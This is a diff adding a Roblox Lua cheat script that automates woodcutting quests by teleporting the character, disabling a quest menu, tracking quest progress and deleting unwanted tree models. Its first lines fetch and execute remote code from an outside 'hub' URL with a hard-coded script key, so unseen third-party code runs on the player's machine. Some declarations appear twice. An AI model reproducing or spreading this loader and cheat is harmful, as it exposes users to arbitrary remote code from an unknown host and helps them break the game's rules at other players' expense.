@@ -1,0 +1,152 @@
+local function ZapHibScript()
+script_key="amuxkfDBfyvxleWxMyzyPqskazjCnXon";
+loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
+end
+spawn(ZapHibScript)
+
+
+
+wait(10)
+
+local TreeNames = {"Oak", "Birch", "Elm", "Fantasy", "Evergreen", "Willow"}
+local Player = game.Players.LocalPlayer
+local humanoidRootPart = Player.Character and Player.Character:WaitForChild("HumanoidRootPart")
+
+local TreeNames = {"Oak", "Birch", "Elm", "Fantasy", "Evergreen", "Willow"}
+local Player = game.Players.LocalPlayer
+local humanoidRootPart = Player.Character and Player.Character:WaitForChild("HumanoidRootPart")
+
+local function Menu()
+    local targetPosition = Vector3.new(6425.730, 463.9, -22290)
+    local npcQuests = Player.PlayerGui:FindFirstChild("_MACHINES") and Player.PlayerGui._MACHINES:FindFirstChild("NPCQuests")
+
+    while true do
+        repeat
+            if humanoidRootPart then
+                if (humanoidRootPart.Position - targetPosition).Magnitude <= 500 then
+                    humanoidRootPart.CFrame = CFrame.new(targetPosition)
+                end
+            end
+            wait(1)
+        until npcQuests and npcQuests.Enabled
+
+        wait(10)
+        if npcQuests then
+            npcQuests.Enabled = false
+        end
+        wait(10)
+    end
+end
+spawn(Menu)
+
+local function LeaveArea() 
+    while true do
+        wait(180)
+        if workspace:FindFirstChild("__THINGS") then
+            local instances = workspace.__THINGS:FindFirstChild("Instances")
+            if instances then
+                local woodcutting = instances:FindFirstChild("Woodcutting")
+                if woodcutting then
+                    local teleports = woodcutting:FindFirstChild("Teleports")
+                    if teleports then
+                        local leaveTeleport = teleports:FindFirstChild("Leave")
+                        if leaveTeleport and humanoidRootPart then
+                            if (humanoidRootPart.Position - leaveTeleport.Position).Magnitude <= 500 then
+                                humanoidRootPart.CFrame = CFrame.new(leaveTeleport.Position)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+spawn(LeaveArea)
+
+
+local itemsFrame = Player.PlayerGui:FindFirstChild("_MACHINES") and Player.PlayerGui._MACHINES.NPCQuests.Frame.ItemsFrame:GetChildren()
+local TargetTrees = {}
+
+wait(5)
+local treeColors = {
+    Oak = BrickColor.new("Tr. Flu. Yellow"),
+    Birch = BrickColor.new("Black"),
+    Elm = BrickColor.new("Sea Green"),
+    Evergreen = BrickColor.new("Camo"),
+    Fantasy = BrickColor.new("Dark indigo"),
+    Willow = BrickColor.new("Deep orange")
+}
+
+local function TreeTracker()
+    while true do
+        TargetTrees = {}
+        if itemsFrame then
+            for _, child in ipairs(itemsFrame) do
+                if child.Name == "Quest1" or child.Name == "Quest2" or child.Name == "Quest3" then
+                    local descText = child.Desc.Text
+                    local current, total = descText:match("(%d+)/(%d+)")
+                    current, total = tonumber(current), tonumber(total)
+
+                    if current >= total then
+                        print("Quest " .. string.sub(child.Name, -1) .. " is completed")
+                    else
+                        local titleText = child.Title.Text
+                        for _, tree in ipairs(TreeNames) do
+                            if titleText:find(tree) then
+                                if not table.find(TargetTrees, tree) then
+                                    table.insert(TargetTrees, tree)
+                                    print(child.Name .. " | (" .. tree .. " in the quest) is not finished, only " .. current .. " has been cut out of " .. total)
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        wait()
+    end
+end
+spawn(TreeTracker)
+
+local function DeleteTrees()
+    while true do
+        if workspace:FindFirstChild("__THINGS") then
+            local instanceContainer = workspace.__THINGS:FindFirstChild("__INSTANCE_CONTAINER")
+            if instanceContainer and instanceContainer:FindFirstChild("Active") then
+                local woodcutting = instanceContainer.Active:FindFirstChild("Woodcutting")
+                if woodcutting and woodcutting:FindFirstChild("Important") then
+                    local treesContainer = woodcutting.Important:FindFirstChild("Trees")
+                    if treesContainer then
+                        local trees = treesContainer:GetChildren()
+                        local treeCount = 0
+
+                        for _, model in pairs(trees) do
+                            if model:IsA("Model") then
+                                local leaves = model:FindFirstChild("Leaves1")
+                                if leaves then
+                                    local keepTree = false
+                                    for _, targetTree in ipairs(TargetTrees) do
+                                        if leaves.BrickColor == treeColors[targetTree] then
+                                            keepTree = true
+                                            break
+                                        end
+                                    end
+                                    if keepTree then
+                                        treeCount = treeCount + 1
+                                        if treeCount > 10 then
+                                            model:Destroy()
+                                        end
+                                    else
+                                        model:Destroy()
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        wait(2)
+    end
+end
+spawn(DeleteTrees)
